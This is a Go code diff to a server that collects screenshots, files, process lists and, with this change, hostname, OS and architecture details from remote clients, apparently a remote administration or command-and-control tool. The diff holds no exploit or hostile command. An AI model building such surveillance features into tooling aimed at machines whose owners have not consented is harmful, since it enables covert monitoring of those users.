@@ -39,6 +39,7 @@ type Server struct {
 	fileDataResults    map[string]*common.FileDataPayload
 	screenshotResults  map[string]*common.ScreenshotDataPayload
 	processListResults map[string]*common.ProcessListPayload
+	systemInfoResults  map[string]*common.SystemInfoPayload
 	resultsMu          sync.RWMutex
 	httpServer         *http.Server
 	serverMu           sync.Mutex
@@ -96,6 +97,7 @@ func NewServer(config *Config) *Server {
 		fileDataResults:    make(map[string]*common.FileDataPayload),
 		screenshotResults:  make(map[string]*common.ScreenshotDataPayload),
 		processListResults: make(map[string]*common.ProcessListPayload),
+		systemInfoResults:  make(map[string]*common.SystemInfoPayload),
 	}
 
 	// Set server reference in web handler
@@ -207,6 +209,7 @@ func (s *Server) Start() error {
 	router.POST("/api/client/alias", s.ginHandleUpdateClientAlias)
 	router.GET("/api/files", s.ginHandleFilesAPI)
 	router.GET("/api/processes", s.ginHandleProcessesAPI)
+	router.GET("/api/system-info", s.ginHandleSystemInfoAPI)
 	router.GET("/api/proxy-file", s.ginProxyFileServer)
 
 	// Admin API endpoints (new)
@@ -348,6 +351,10 @@ func (s *Server) ginHandleFilesAPI(c *gin.Context) {
 
 func (s *Server) ginHandleProcessesAPI(c *gin.Context) {
 	s.HandleProcessesAPI(c.Writer, c.Request)
+}
+
+func (s *Server) ginHandleSystemInfoAPI(c *gin.Context) {
+	s.HandleSystemInfoAPI(c.Writer, c.Request)
 }
 
 func (s *Server) ginProxyFileServer(c *gin.Context) {
@@ -670,6 +677,15 @@ func (s *Server) handleMessage(client *Client, msg *common.Message) {
 			log.Printf("Process list from %s", client.ID)
 		}
 
+	case common.MsgTypeSystemInfo:
+		var si common.SystemInfoPayload
+		if err := msg.ParsePayload(&si); err == nil {
+			log.Printf("System info from %s: %s (%s %s)", client.ID, si.Hostname, si.OS, si.Arch)
+			s.SetSystemInfoResult(client.ID, &si)
+		} else {
+			log.Printf("System info from %s", client.ID)
+		}
+
 	case common.MsgTypeFileData:
 		var fd common.FileDataPayload
 		if err := msg.ParsePayload(&fd); err == nil {
@@ -874,6 +890,28 @@ func (s *Server) ClearProcessListResult(clientID string) {
 	delete(s.processListResults, clientID)
 }
 
+// GetSystemInfoResult retrieves stored system info result for a client
+func (s *Server) GetSystemInfoResult(clientID string) (*common.SystemInfoPayload, bool) {
+	s.resultsMu.RLock()
+	defer s.resultsMu.RUnlock()
+	result, exists := s.systemInfoResults[clientID]
+	return result, exists
+}
+
+// SetSystemInfoResult stores system info result for a client
+func (s *Server) SetSystemInfoResult(clientID string, payload *common.SystemInfoPayload) {
+	s.resultsMu.Lock()
+	defer s.resultsMu.Unlock()
+	s.systemInfoResults[clientID] = payload
+}
+
+// ClearSystemInfoResult removes stored system info result
+func (s *Server) ClearSystemInfoResult(clientID string) {
+	s.resultsMu.Lock()
+	defer s.resultsMu.Unlock()
+	delete(s.systemInfoResults, clientID)
+}
+
 // clearCachedClientData removes any cached result blobs for a client
 func (s *Server) clearCachedClientData(clientID string) {
 	s.resultsMu.Lock()
@@ -883,6 +921,7 @@ func (s *Server) clearCachedClientData(clientID string) {
 	delete(s.fileDataResults, clientID)
 	delete(s.screenshotResults, clientID)
 	delete(s.processListResults, clientID)
+	delete(s.systemInfoResults, clientID)
 	s.resultsMu.Unlock()
 }
 
